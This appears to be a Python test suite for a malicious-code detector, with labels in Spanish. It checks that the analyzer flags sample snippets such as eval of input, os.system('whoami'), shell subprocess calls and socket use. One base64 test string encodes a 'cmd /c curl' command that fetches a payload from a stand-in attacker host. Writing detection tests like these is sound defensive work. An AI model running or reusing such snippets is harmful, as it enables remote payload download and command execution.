import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.stdout.reconfigure(encoding="utf-8")

from core.deep_analyzer import deep_analyze


def _scan(code):
    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False, encoding="utf-8") as fh:
        fh.write(code)
        name = fh.name
    try:
        return deep_analyze(name)
    finally:
        Path(name).unlink(missing_ok=True)


def rules_of(result):
    return sorted(f["rule_id"] for f in result["findings"])


def check(label, got, expected):
    assert got == expected, f"{label}: esperado {expected}, obtenido {got}"
    print(f"OK  {label} -> {got}")


clean = _scan("def suma(a, b):\n    return a + b\n")
check("limpio score", clean["score"], 0)
check("limpio estado", clean["estado"], "limpio")
check("limpio sin hallazgos", clean["findings"], [])

ev = _scan("payload = input()\neval(payload)\n")
check("eval detectado", "eval_exec" in rules_of(ev), True)
check("eval score > 0", ev["score"] > 0, True)
check("eval aislado queda en revisión", ev["estado"], "pendiente")
check("eval mitre", ev["findings"][0]["mitre_id"], "T1059.006")
check("eval linea", ev["findings"][0]["line"], 2)

imp = _scan("mod = __import__('os')\n")
check("import dinamico", "dynamic_import" in rules_of(imp), True)

shell = _scan("import os\nos.system('whoami')\n")
check("os.system", "os_system" in rules_of(shell), True)

subp = _scan("import subprocess\nsubprocess.run(cmd, shell=True)\n")
check("subprocess", "subprocess_shell" in rules_of(subp), True)

b64 = _scan("import base64\ndata = base64.b64decode(blob)\n")
check("b64", "b64_decode" in rules_of(b64), True)

net = _scan("from urllib.request import urlopen\nurlopen('http://x.y/z')\n")
check("red", "network" in rules_of(net), True)

sock = _scan("import socket\ns = socket.socket()\n")
check("socket", "socket" in rules_of(sock), True)

destroy = _scan("import os\nos.remove('/tmp/x')\n")
check("destruccion", "file_destroy" in rules_of(destroy), True)

enc = _scan("blob = 'Y21kIC9jIGN1cmwgaHR0cDovL2V2aWwuZXhhbXBsZS9wYXlsb2FkLmJhdA=='\n")
check("string codificada", "encoded_string" in rules_of(enc), True)

multi = _scan(
    "import os, base64\n"
    "payload = base64.b64decode('A'*60)\n"
    "exec(payload)\n"
    "os.system('whoami')\n"
)
check("multi score cap", multi["score"] <= 100, True)
check("multi score alto", multi["score"] >= 50, True)
check("multi estado", multi["estado"], "alerta")

broken = _scan("def f(:\n    pass\n")
check("sintaxis rota estado", broken["estado"], "pendiente")
check("sintaxis rota error", broken["error"] is not None, True)

low = _scan("d = {}\nval = getattr(d, 'keys')()\n")
check("getattr score bajo", low["score"] < 25, True)
check("getattr solo es señal débil", low["estado"], "limpio")

print("\nTodos los casos del deep_analyzer pasaron.")
